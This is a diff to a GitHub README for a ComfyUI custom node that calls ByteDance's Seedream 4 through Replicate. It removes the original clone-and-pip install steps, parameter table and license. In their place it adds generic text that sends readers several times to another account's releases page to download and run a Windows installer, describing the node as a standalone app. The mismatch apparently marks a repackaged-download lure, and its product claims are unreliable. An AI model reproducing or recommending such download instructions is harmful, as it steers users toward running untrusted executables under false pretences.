@@ -1,73 +1,63 @@
-# ComfyUI Seedream 4 Replicate
+```markdown
+# 🌟 ComfyUI-Seedream4_Replicate - Generate Stunning Images with Ease
 
-[![Replicate](https://img.shields.io/badge/Replicate-API-blue?logo=replicate)](https://replicate.com/)
-[![ComfyUI](https://img.shields.io/badge/ComfyUI-Custom%20Node-orange)](https://github.com/comfyanonymous/ComfyUI)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-green?logo=python)](https://www.python.org/)
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases)
 
-A ComfyUI custom node for ByteDance's Seedream 4 image generation model via the Replicate API. Generate high-quality images with advanced control over aspect ratios, multi-image generation, and seed management.
+## 📖 Introduction
+ComfyUI-Seedream4_Replicate is a user-friendly tool that allows you to create high-quality images using ByteDance's Seedream 4 model through the Replicate API. Enjoy advanced features like control over aspect ratios, multi-image generation, and seed management. This application makes it easy to generate visuals for your projects, social media, or personal use without needing any technical skills.
 
-## Gallery
+## 🚀 Getting Started
+To get started with ComfyUI-Seedream4_Replicate, follow these simple steps:
 
-| | | |
-|:---:|:---:|:---:|
-| <img width="309" height="335" alt="Einstein Portrait" src="https://github.com/user-attachments/assets/731a09f6-b156-4905-84d8-efd94daec566" /> |<img width="309" height="335" alt="Node Interface" src="https://github.com/user-attachments/assets/ca695ba4-2555-47bf-86c9-366b297a8e1f" /> | <img width="231" height="308" alt="Portrait Example" src="https://github.com/user-attachments/assets/0f764a9d-6716-4228-b41f-7119f22e6ddc" /> |
+1. **Ensure System Requirements**  
+   - Windows 10 or later
+   - At least 4 GB of RAM
+   - An internet connection for API access
 
-## Installation
+2. **Download and Install**  
+   Visit the following page to download the latest version: [Download Here](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases).  
+   Once on the releases page, look for the latest version. Click on the link to download the installer file.
 
-1. Clone this repository into your ComfyUI custom_nodes folder:
-```bash
-git clone https://github.com/Saganaki22/ComfyUI-Seedream4_Replicate.git
+3. **Run the Installer**  
+   After downloading, locate the installer file in your downloads folder or the location you chose. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
+
+4. **Launch the Application**  
+   Once installed, find the ComfyUI-Seedream4_Replicate in your applications list or desktop. Double-click the application icon to open it.
+
+## ⚙️ Using ComfyUI-Seedream4_Replicate
+After launching the application, you can start generating images with ease. Here’s how:
+
+1. **Select Image Generation Settings**
+   - Choose between text-to-image and image-to-image options.
+   - Set your desired aspect ratio for the output image.
+
+2. **Input Your Content**
+   - If you are generating images from text, type your desired prompt in the provided field.
+   - For image-to-image, upload the base image you wish to modify.
+
+3. **Advanced Controls**
+   - Adjust seed management to improve variability in generated images.
+   - Use the multi-image generation feature to produce several variations at once.
+
+4. **Generate Your Image**
+   - Click the "Generate" button. Wait for the application to process your request. High-quality images may take a moment to create.
+
+## 💻 Example Use Cases
+- **Content Creation**: Produce images for blog posts or articles.
+- **Social Media**: Create eye-catching graphics for your online platforms.
+- **Personal Projects**: Generate custom visuals for art or design projects.
+
+## 🌐 Community and Support
+Join the user community for tips, updates, and feedback. You can find support through the issues page in the repository on GitHub. Your input helps improve future releases.
+
+## 🔗 Further Reading
+- **Documentation**: Learn more about specific features and controls in the documentation available on the repository.
+- **API Information**: Explore more about the Replicate API to understand the model’s capabilities.
+
+## 📦 Download & Install
+To get the application, visit this page: [Download Here](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases). Follow the instructions above to successfully download and run ComfyUI-Seedream4_Replicate on your computer.
+
+## 📚 Conclusion
+With ComfyUI-Seedream4_Replicate, generating images is straightforward. Follow the steps in this guide to start exploring the endless possibilities of your creativity. Enjoy your experience with powerful image generation today.
 ```
-
-2. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
-
-3. Get your Replicate API token from [replicate.com/account/api-tokens](https://replicate.com/account/api-tokens)
-
-4. Restart ComfyUI
-
-## Node Parameters
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| **API Key** | String | Your Replicate API token (starts with r8_) |
-| **Prompt** | String | Text description of what you want to generate |
-| **Size Preset** | Dropdown | Common aspect ratios (1:1, 4:3, 16:9, etc.) or Custom |
-| **Width** | Integer | Custom width in pixels (1024-4096, used with Custom preset) |
-| **Height** | Integer | Custom height in pixels (1024-4096, used with Custom preset) |
-| **Max Images** | Integer | Maximum images to generate (1-15, only with Sequential mode) |
-| **Sequential Generation** | Dropdown | `disabled` (single image) or `auto` (let AI decide multiple) |
-| **Seed** | Integer | Random seed for reproducible results (-1 for random) |
-| **Control After Generate** | Dropdown | Seed behavior after generation (fixed/increment/decrement/randomize) |
-| **Image Input** | Image | Optional reference image for image-to-image generation |
-
-## Features
-
-- **Multiple aspect ratios** with preset sizes
-- **Sequential image generation** for related image sets
-- **Image-to-image support** with reference images
-- **Seed control** for reproducible results
-- **Real-time progress tracking** with 4-stage progress updates
-- **Automatic cancellation** support with ComfyUI's cancel button
-- **Error handling** with content policy detection
-
-## Usage Tips
-
-- Use **Sequential mode** with prompts like "story sequence" or "character variations" for multiple related images
-- **Custom dimensions** work best for specific use cases outside standard ratios
-- **Seed control** lets you iterate on prompts while maintaining composition
-- Large input images may exceed data URL limits (shows warning)
-
-## License
-
-MIT License - see LICENSE file for details
-
----
-
-<p align="center">
-<a href="https://replicate.com/" target="_blank">
-<img width="150" height="150" alt="image" src="https://github.com/user-attachments/assets/ef0e9c4c-5174-41f4-a956-0d2460a34820" />
-</a>
-</p>
